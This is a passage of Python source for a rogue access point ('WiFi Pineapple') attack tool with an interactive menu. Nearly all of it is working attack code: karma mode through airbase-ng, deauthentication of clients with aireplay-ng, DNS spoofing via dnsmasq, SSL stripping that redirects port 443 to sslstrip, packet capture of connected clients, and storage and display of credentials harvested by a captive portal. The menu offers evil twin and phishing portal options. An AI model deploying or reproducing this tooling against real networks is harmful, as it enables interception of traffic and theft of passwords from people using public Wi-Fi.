                self._karma_proc = subprocess.Popen(
                    [self.airbase, '-P', '-C', '30', '-e', 'FreeWiFi', '-v', iface],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                time.sleep(1)
                if self._karma_proc.poll() is not None:
                    stderr = self._karma_proc.stderr.read().decode(errors='replace')
                    return {'ok': False, 'error': f'airbase-ng failed: {stderr[:200]}'}

                self._karma_active = True
                return {'ok': True, 'message': 'Karma mode enabled via airbase-ng'}
            except Exception as e:
                return {'ok': False, 'error': str(e)}

        return {'ok': False, 'error': 'Neither hostapd-mana nor airbase-ng found'}

    def disable_karma(self) -> Dict:
        """Stop karma mode."""
        if not self._karma_active:
            return {'ok': False, 'error': 'Karma mode is not active'}

        if self._karma_proc:
            try:
                self._karma_proc.terminate()
                self._karma_proc.wait(timeout=5)
            except Exception:
                try:
                    self._karma_proc.kill()
                except Exception:
                    pass
            self._karma_proc = None

        self._karma_active = False
        return {'ok': True, 'message': 'Karma mode disabled'}

    # ── Client Management ────────────────────────────────────────────────

    def get_clients(self) -> List[Dict]:
        """List connected clients from DHCP leases and ARP table."""
        clients = {}

        # Parse dnsmasq lease file
        lease_file = os.path.join(self.data_dir, 'dnsmasq.leases')
        if os.path.exists(lease_file):
            try:
                with open(lease_file, 'r') as f:
                    for line in f:
                        parts = line.strip().split()
                        if len(parts) >= 4:
                            mac = parts[1].upper()
                            ip = parts[2]
                            hostname = parts[3] if parts[3] != '*' else ''
                            clients[mac] = {
                                'mac': mac,
                                'ip': ip,
                                'hostname': hostname,
                                'os': self._fingerprint_os(hostname, mac),
                                'first_seen': self._clients.get(mac, {}).get(
                                    'first_seen', datetime.now().isoformat()),
                                'last_seen': datetime.now().isoformat(),
                                'data_usage': self._clients.get(mac, {}).get('data_usage', 0)
                            }
            except Exception:
                pass

        # Supplement with ARP table
        try:
            arp_output = subprocess.check_output(
                ['arp', '-an'], text=True, timeout=5, stderr=subprocess.DEVNULL
            )
            for line in arp_output.splitlines():
                m = re.match(r'\S+\s+\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]+)', line)
                if m:
                    ip = m.group(1)
                    mac = m.group(2).upper()
                    if ip.startswith('10.0.0.') and mac not in clients:
                        clients[mac] = {
                            'mac': mac,
                            'ip': ip,
                            'hostname': '',
                            'os': '',
                            'first_seen': self._clients.get(mac, {}).get(
                                'first_seen', datetime.now().isoformat()),
                            'last_seen': datetime.now().isoformat(),
                            'data_usage': self._clients.get(mac, {}).get('data_usage', 0)
                        }
        except Exception:
            pass

        with self._lock:
            self._clients.update(clients)

        return list(self._clients.values())

    def kick_client(self, mac_address: str) -> Dict:
        """Deauthenticate specific client from rogue AP."""
        if not self._ap_running:
            return {'ok': False, 'error': 'AP is not running'}
        if not mac_address:
            return {'ok': False, 'error': 'MAC address is required'}

        mac = mac_address.upper()

        # Use aireplay-ng to send deauth
        if self.aireplay and self._ap_interface:
            try:
                # Get the AP BSSID from interface
                ap_mac = self._get_interface_mac(self._ap_interface)
                if not ap_mac:
                    ap_mac = 'FF:FF:FF:FF:FF:FF'

                subprocess.run(
                    [self.aireplay, '-0', '3', '-a', ap_mac, '-c', mac, self._ap_interface],
                    capture_output=True, timeout=10
                )

                # Remove from client list
                if mac in self._clients:
                    del self._clients[mac]

                return {'ok': True, 'message': f'Deauth sent to {mac}'}
            except Exception as e:
                return {'ok': False, 'error': str(e)}

        # Fallback: use hostapd_cli
        hostapd_cli = shutil.which('hostapd_cli')
        if hostapd_cli:
            try:
                subprocess.run(
                    [hostapd_cli, 'deauthenticate', mac],
                    capture_output=True, timeout=5
                )
                if mac in self._clients:
                    del self._clients[mac]
                return {'ok': True, 'message': f'Client {mac} deauthenticated'}
            except Exception as e:
                return {'ok': False, 'error': str(e)}

        return {'ok': False, 'error': 'No tool available to kick client'}

    # ── DNS Spoofing ─────────────────────────────────────────────────────

    def enable_dns_spoof(self, spoofs: Dict[str, str]) -> Dict:
        """Configure dnsmasq to resolve specific domains to specified IPs."""
        if not spoofs:
            return {'ok': False, 'error': 'No spoofs provided'}

        self._dns_spoofs = dict(spoofs)
        self._dns_spoof_active = True

        # If AP is running, restart dnsmasq with new config
        if self._ap_running:
            return self._restart_dnsmasq()

        return {
            'ok': True,
            'message': f'DNS spoofing configured for {len(spoofs)} domain(s). '
                       'Spoofs will activate when AP starts.',
            'spoofs': spoofs
        }

    def disable_dns_spoof(self) -> Dict:
        """Restore normal DNS resolution."""
        self._dns_spoofs.clear()
        self._dns_spoof_active = False

        if self._ap_running:
            return self._restart_dnsmasq()

        return {'ok': True, 'message': 'DNS spoofing disabled'}

    # ── SSL Strip ────────────────────────────────────────────────────────

    def enable_ssl_strip(self) -> Dict:
        """Set up iptables + sslstrip to downgrade HTTPS connections."""
        if not self._ap_running:
            return {'ok': False, 'error': 'Start rogue AP first'}
        if self._sslstrip_active:
            return {'ok': False, 'error': 'SSL strip is already running'}
        if not self.sslstrip_bin:
            return {'ok': False, 'error': 'sslstrip not found. Install with: pip install sslstrip'}
        if not self.iptables:
            return {'ok': False, 'error': 'iptables not found'}

        sslstrip_port = 10000

        try:
            # Enable IP forwarding
            subprocess.run(
                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                capture_output=True, timeout=5
            )

            # Redirect HTTPS traffic to sslstrip
            subprocess.run([
                self.iptables, '-t', 'nat', '-A', 'PREROUTING',
                '-i', self._ap_interface, '-p', 'tcp', '--dport', '443',
                '-j', 'REDIRECT', '--to-port', str(sslstrip_port)
            ], capture_output=True, timeout=5)

            # Start sslstrip
            log_file = os.path.join(self.data_dir, 'sslstrip.log')
            self._sslstrip_proc = subprocess.Popen(
                [self.sslstrip_bin, '-l', str(sslstrip_port), '-w', log_file],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(1)

            if self._sslstrip_proc.poll() is not None:
                stderr = self._sslstrip_proc.stderr.read().decode(errors='replace')
                return {'ok': False, 'error': f'sslstrip failed: {stderr[:200]}'}

            self._sslstrip_active = True
            return {'ok': True, 'message': f'SSL strip enabled on port {sslstrip_port}'}

        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def disable_ssl_strip(self) -> Dict:
        """Remove sslstrip iptables rules and stop sslstrip."""
        if not self._sslstrip_active:
            return {'ok': False, 'error': 'SSL strip is not running'}

        sslstrip_port = 10000

        # Kill sslstrip
        if self._sslstrip_proc:
            try:
                self._sslstrip_proc.terminate()
                self._sslstrip_proc.wait(timeout=5)
            except Exception:
                try:
                    self._sslstrip_proc.kill()
                except Exception:
                    pass
            self._sslstrip_proc = None

        # Remove iptables rule
        if self.iptables and self._ap_interface:
            try:
                subprocess.run([
                    self.iptables, '-t', 'nat', '-D', 'PREROUTING',
                    '-i', self._ap_interface, '-p', 'tcp', '--dport', '443',
                    '-j', 'REDIRECT', '--to-port', str(sslstrip_port)
                ], capture_output=True, timeout=5)
            except Exception:
                pass

        self._sslstrip_active = False
        return {'ok': True, 'message': 'SSL strip disabled'}

    # ── Traffic Capture ──────────────────────────────────────────────────

    def sniff_traffic(self, interface: str = None, filter_expr: str = None,
                      duration: int = 60) -> Dict:
        """Capture packets from connected clients."""
        iface = interface or self._ap_interface
        if not iface:
            return {'ok': False, 'error': 'No interface specified'}
        if not self.tcpdump:
            return {'ok': False, 'error': 'tcpdump not found'}
        if self._sniff_proc and self._sniff_proc.poll() is None:
            return {'ok': False, 'error': 'Capture already running. Stop it first.'}

        cap_file = os.path.join(
            self.traffic_dir, f'traffic_{int(time.time())}.pcap'
        )

        cmd = [self.tcpdump, '-i', iface, '-w', cap_file, '-c', '10000']
        if filter_expr:
            cmd.extend(filter_expr.split())

        try:
            self._sniff_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )

            # Schedule auto-stop
            def _auto_stop():
                time.sleep(duration)
                if self._sniff_proc and self._sniff_proc.poll() is None:
                    try:
                        self._sniff_proc.send_signal(signal.SIGINT)
                        self._sniff_proc.wait(timeout=5)
                    except Exception:
                        pass

            threading.Thread(target=_auto_stop, daemon=True).start()

            return {
                'ok': True,
                'message': f'Traffic capture started on {iface} ({duration}s)',
                'capture_file': cap_file,
                'pid': self._sniff_proc.pid
            }

        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def stop_sniff(self) -> Dict:
        """Stop traffic capture."""
        if self._sniff_proc and self._sniff_proc.poll() is None:
            try:
                self._sniff_proc.send_signal(signal.SIGINT)
                self._sniff_proc.wait(timeout=5)
            except Exception:
                try:
                    self._sniff_proc.kill()
                except Exception:
                    pass
            self._sniff_proc = None
            return {'ok': True, 'message': 'Traffic capture stopped'}
        return {'ok': False, 'error': 'No capture running'}

    def get_traffic_stats(self) -> Dict:
        """Get bandwidth usage, top domains, top clients."""
        stats = {
            'total_bytes': 0,
            'top_domains': [],
            'top_clients': [],
            'capture_files': []
        }

        # Parse dnsmasq query log for top domains
        log_file = os.path.join(self.data_dir, 'dnsmasq.log')
        domain_counts: Dict[str, int] = {}
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r') as f:
                    for line in f:
                        m = re.search(r'query\[A\]\s+(\S+)\s+from\s+(\S+)', line)
                        if m:
                            domain = m.group(1)
                            client_ip = m.group(2)
                            domain_counts[domain] = domain_counts.get(domain, 0) + 1
            except Exception:
                pass

        stats['top_domains'] = sorted(
            [{'domain': k, 'queries': v} for k, v in domain_counts.items()],
            key=lambda x: x['queries'], reverse=True
        )[:20]

        # Client data from leases
        client_usage = {}
        for mac, info in self._clients.items():
            client_usage[mac] = {
                'mac': mac,
                'ip': info.get('ip', ''),
                'hostname': info.get('hostname', ''),
                'data_usage': info.get('data_usage', 0)
            }

        stats['top_clients'] = sorted(
            list(client_usage.values()),
            key=lambda x: x['data_usage'], reverse=True
        )[:20]

        # List traffic capture files
        try:
            traffic_path = Path(self.traffic_dir)
            for f in sorted(traffic_path.glob('*.pcap'), reverse=True):
                stats['capture_files'].append({
                    'name': f.name,
                    'path': str(f),
                    'size': f.stat().st_size,
                    'modified': datetime.fromtimestamp(f.stat().st_mtime).isoformat()
                })
        except Exception:
            pass

        return stats

    # ── NAT / iptables Helpers ───────────────────────────────────────────

    def _setup_nat(self, ap_iface: str, inet_iface: str, subnet: str):
        """Set up NAT forwarding between AP and internet interface."""
        if not self.iptables:
            return

        try:
            # Enable IP forwarding
            subprocess.run(
                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                capture_output=True, timeout=5
            )

            # NAT masquerade
            subprocess.run([
                self.iptables, '-t', 'nat', '-A', 'POSTROUTING',
                '-o', inet_iface, '-j', 'MASQUERADE'
            ], capture_output=True, timeout=5)

            # Allow forwarding
            subprocess.run([
                self.iptables, '-A', 'FORWARD',
                '-i', ap_iface, '-o', inet_iface, '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)

            subprocess.run([
                self.iptables, '-A', 'FORWARD',
                '-i', inet_iface, '-o', ap_iface,
                '-m', 'state', '--state', 'RELATED,ESTABLISHED',
                '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)

        except Exception:
            pass

    def _teardown_nat(self, ap_iface: str, inet_iface: str):
        """Remove NAT forwarding rules."""
        if not self.iptables:
            return

        try:
            subprocess.run([
                self.iptables, '-t', 'nat', '-D', 'POSTROUTING',
                '-o', inet_iface, '-j', 'MASQUERADE'
            ], capture_output=True, timeout=5)

            subprocess.run([
                self.iptables, '-D', 'FORWARD',
                '-i', ap_iface, '-o', inet_iface, '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)

            subprocess.run([
                self.iptables, '-D', 'FORWARD',
                '-i', inet_iface, '-o', ap_iface,
                '-m', 'state', '--state', 'RELATED,ESTABLISHED',
                '-j', 'ACCEPT'
            ], capture_output=True, timeout=5)
        except Exception:
            pass

    def _restart_dnsmasq(self) -> Dict:
        """Restart dnsmasq with current configuration (including DNS spoofs)."""
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=5)
            except Exception:
                try:
                    self._dnsmasq_proc.kill()
                except Exception:
                    pass

        ap_ip = '10.0.0.1'
        dnsmasq_conf = os.path.join(self.configs_dir, 'dnsmasq.conf')
        dns_lines = [
            f'interface={self._ap_interface}',
            'bind-interfaces',
            f'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h',
            f'dhcp-option=3,{ap_ip}',
            f'dhcp-option=6,{ap_ip}',
            'server=8.8.8.8',
            'server=8.8.4.4',
            'log-queries',
            f'log-facility={os.path.join(self.data_dir, "dnsmasq.log")}',
            f'dhcp-leasefile={os.path.join(self.data_dir, "dnsmasq.leases")}',
        ]

        if self._dns_spoof_active and self._dns_spoofs:
            for domain, ip in self._dns_spoofs.items():
                dns_lines.append(f'address=/{domain}/{ip}')

        with open(dnsmasq_conf, 'w') as f:
            f.write('\n'.join(dns_lines) + '\n')

        try:
            self._dnsmasq_proc = subprocess.Popen(
                [self.dnsmasq, '-C', dnsmasq_conf, '-d'],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(0.5)
            if self._dnsmasq_proc.poll() is not None:
                stderr = self._dnsmasq_proc.stderr.read().decode(errors='replace')
                return {'ok': False, 'error': f'dnsmasq restart failed: {stderr[:200]}'}

            msg = 'dnsmasq restarted'
            if self._dns_spoof_active:
                msg += f' with {len(self._dns_spoofs)} DNS spoof(s)'
            return {'ok': True, 'message': msg}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    # ── Internal Helpers ─────────────────────────────────────────────────

    def _get_interface_mac(self, interface: str) -> str:
        """Get MAC address of an interface."""
        try:
            mac_file = Path(f'/sys/class/net/{interface}/address')
            if mac_file.exists():
                return mac_file.read_text().strip().upper()
        except Exception:
            pass

        if self.ip_bin:
            try:
                out = subprocess.check_output(
                    [self.ip_bin, 'link', 'show', interface],
                    text=True, timeout=5
                )
                m = re.search(r'link/ether\s+([0-9a-fA-F:]+)', out)
                if m:
                    return m.group(1).upper()
            except Exception:
                pass
        return ''

    def _fingerprint_os(self, hostname: str, mac: str) -> str:
        """Basic OS fingerprinting from hostname and MAC OUI."""
        hostname_lower = hostname.lower() if hostname else ''

        if 'iphone' in hostname_lower or 'ipad' in hostname_lower:
            return 'iOS'
        if 'android' in hostname_lower or 'galaxy' in hostname_lower or 'pixel' in hostname_lower:
            return 'Android'
        if 'macbook' in hostname_lower or 'imac' in hostname_lower:
            return 'macOS'
        if hostname_lower.startswith('desktop-') or hostname_lower.startswith('laptop-'):
            return 'Windows'

        # OUI-based fingerprinting
        oui = mac[:8].upper() if mac else ''
        apple_ouis = [
            '00:03:93', '00:05:02', '00:0A:27', '00:0A:95', '00:0D:93',
            '00:10:FA', '00:11:24', '00:14:51', '00:16:CB', '00:17:F2',
            '00:19:E3', '00:1B:63', '00:1C:B3', '00:1D:4F', '00:1E:52',
            '00:1E:C2', '00:1F:5B', '00:1F:F3', '00:21:E9', '00:22:41',
            '00:23:12', '00:23:32', '00:23:6C', '00:23:DF', '00:24:36',
            '00:25:00', '00:25:4B', '00:25:BC', '00:26:08', '00:26:4A',
            '00:26:B0', '00:26:BB', '3C:07:54', '7C:D1:C3', 'A4:83:E7',
            'AC:BC:32', 'B8:53:AC', 'D0:E1:40', 'F0:B4:79', 'F4:5C:89',
        ]
        if oui in apple_ouis:
            return 'Apple'

        samsung_ouis = ['00:07:AB', '00:12:47', '00:15:99', '00:16:32', '00:17:D5',
                        '00:18:AF', '00:1A:8A', '00:1B:98', '00:1C:43', '00:1D:25',
                        '00:1E:E1', '00:1E:E2', '00:21:19', '00:21:D1', '00:23:39',
                        '00:23:99', '00:23:D6', '00:23:D7', '00:24:54', '00:24:90',
                        '00:24:91', '00:25:66', '00:25:67', '00:26:37', '00:26:5D']
        if oui in samsung_ouis:
            return 'Android (Samsung)'

        return ''

    def _save_captures(self):
        """Persist captured credentials to disk."""
        cap_file = os.path.join(self.data_dir, 'portal_captures.json')
        try:
            with open(cap_file, 'w') as f:
                json.dump(self._portal_captures, f, indent=2)
        except Exception:
            pass

    def _load_captures(self):
        """Load persisted captures from disk."""
        cap_file = os.path.join(self.data_dir, 'portal_captures.json')
        if os.path.exists(cap_file):
            try:
                with open(cap_file, 'r') as f:
                    self._portal_captures = json.load(f)
            except Exception:
                self._portal_captures = []


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None

def get_pineapple() -> PineappleAP:
    global _instance
    if _instance is None:
        _instance = PineappleAP()
    return _instance


# ── CLI Interface ────────────────────────────────────────────────────────────

def run():
    """CLI entry point for WiFi Pineapple / Rogue AP module."""
    ap = get_pineapple()

    while True:
        status = ap.get_status()
        tools = ap.get_tools_status()
        available = sum(1 for v in tools.values() if v)

        print(f"\n{'='*60}")
        print(f"  WiFi Pineapple / Rogue AP  ({available}/{len(tools)} tools)")
        print(f"{'='*60}")
        if status['running']:
            print(f"  AP Status: RUNNING")
            print(f"  SSID: {status['ssid']}  Channel: {status['channel']}")
            print(f"  Interface: {status['interface']}")
            print(f"  Clients: {status['client_count']}")
            if status['portal_active']:
                print(f"  Portal: {status['portal_type']}")
            if status['karma_active']:
                print(f"  Karma: ACTIVE")
            if status['dns_spoof_active']:
                print(f"  DNS Spoofs: {len(status['dns_spoofs'])} entries")
        else:
            print(f"  AP Status: STOPPED")
        print()
        print("  1 — Start Rogue AP")
        print("  2 — Stop Rogue AP")
        print("  3 — Evil Twin Attack")
        print("  4 — Captive Portal")
        print("  5 — View Clients")
        print("  6 — DNS Spoof")
        print("  7 — Karma Attack")
        print("  8 — SSL Strip")
        print("  9 — View Captures")
        print("  10 — Traffic Stats")
        print("  11 — Tool Status")
        print("  0 — Back")
        print()

        choice = input("  > ").strip()

        if choice == '0':
            break

        elif choice == '1':
            ifaces = ap.get_interfaces()
            wireless = [i for i in ifaces if i.get('wireless', True)]
            if wireless:
                print("  Wireless interfaces:")
                for i, ifc in enumerate(wireless):
                    print(f"    {i+1}. {ifc['name']} (mode={ifc['mode']}, ch={ifc['channel']})")
            ssid = input("  SSID: ").strip()
            iface = input("  Interface: ").strip()
            ch = input("  Channel (default 6): ").strip()
            enc = input("  Encryption (open/wpa2, default open): ").strip() or 'open'
            pwd = ''
            if enc in ('wpa', 'wpa2'):
                pwd = input("  Password: ").strip()
            inet = input("  Internet interface (blank=none): ").strip() or None
            result = ap.start_rogue_ap(
                ssid, iface, int(ch) if ch.isdigit() else 6,
                enc, pwd, inet
            )
            print(f"    {result.get('message', result.get('error', 'Unknown'))}")

        elif choice == '2':
            result = ap.stop_rogue_ap()
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '3':
            target = input("  Target SSID: ").strip()
            bssid = input("  Target BSSID: ").strip()
            iface = input("  Interface: ").strip()
            inet = input("  Internet interface (blank=none): ").strip() or None
            result = ap.evil_twin(target, bssid, iface, inet)
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '4':
            print("  Portal types: hotel_wifi, corporate, social_login, terms_accept")
            ptype = input("  Portal type: ").strip() or 'hotel_wifi'
            if ap._portal_active:
                result = ap.stop_captive_portal()
            else:
                result = ap.start_captive_portal(ptype)
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '5':
            clients = ap.get_clients()
            if clients:
                print(f"    Connected clients ({len(clients)}):")
                for c in clients:
                    print(f"      {c['mac']}  {c['ip']:<15}  {c['hostname']:<20}  {c['os']}")
            else:
                print("    No connected clients")

        elif choice == '6':
            if ap._dns_spoof_active:
                result = ap.disable_dns_spoof()
            else:
                spoofs = {}
                while True:
                    domain = input("  Domain (blank to finish): ").strip()
                    if not domain:
                        break
                    ip = input(f"  IP for {domain}: ").strip()
                    if ip:
                        spoofs[domain] = ip
                if spoofs:
                    result = ap.enable_dns_spoof(spoofs)
                else:
                    result = {'ok': False, 'error': 'No spoofs entered'}
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '7':
            if ap._karma_active:
                result = ap.disable_karma()
            else:
                iface = input("  Interface (blank=AP interface): ").strip() or None
                result = ap.enable_karma(iface)
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '8':
            if ap._sslstrip_active:
                result = ap.disable_ssl_strip()
            else:
                result = ap.enable_ssl_strip()
            print(f"    {result.get('message', result.get('error'))}")

        elif choice == '9':
            captures = ap.get_portal_captures()
            if captures:
                print(f"    Captured credentials ({len(captures)}):")
                for c in captures:
                    print(f"      [{c['timestamp'][:19]}] user={c['username']}  "
                          f"pass={c['password']}  ip={c['ip']}")
            else:
                print("    No captures yet")

        elif choice == '10':
            stats = ap.get_traffic_stats()
            if stats['top_domains']:
                print("    Top domains:")
                for d in stats['top_domains'][:10]:
                    print(f"      {d['domain']:<40}  {d['queries']} queries")
            else:
                print("    No traffic data")

        elif choice == '11':
            for tool, avail in tools.items():
                status_str = 'OK' if avail else 'MISSING'
                print(f"    {tool:<15} {status_str}")
